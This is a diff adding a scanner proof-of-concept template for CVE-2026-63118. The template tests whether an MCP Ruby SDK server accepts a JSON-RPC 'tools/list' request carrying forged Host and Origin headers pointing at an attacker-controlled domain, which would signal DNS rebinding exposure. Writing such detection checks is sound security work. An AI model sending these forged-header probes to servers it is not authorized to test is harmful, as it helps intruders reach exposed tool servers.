@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测 MCP Ruby SDK StreamableHTTPTransport 是否缺少 Host/Origin 头验证，通过向目标 MCP 服务器发送伪造 Host 头的 JSON-RPC 请求，验证是否存在 DNS 重绑定漏洞"
+id = "POC-AVE-2026-0928"
+name = "CVE-2026-63118 PoC"
+severity = "medium"
+tags = ["ave-2026-0928"]
+vuln_id = [
+    "CVE-2026-63118",
+    "AVE-2026-0928",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mcp"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+Host = "attacker-controlled.example.com"
+Origin = "https://attacker-controlled.example.com"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "jsonrpc",
+    "result",
+]
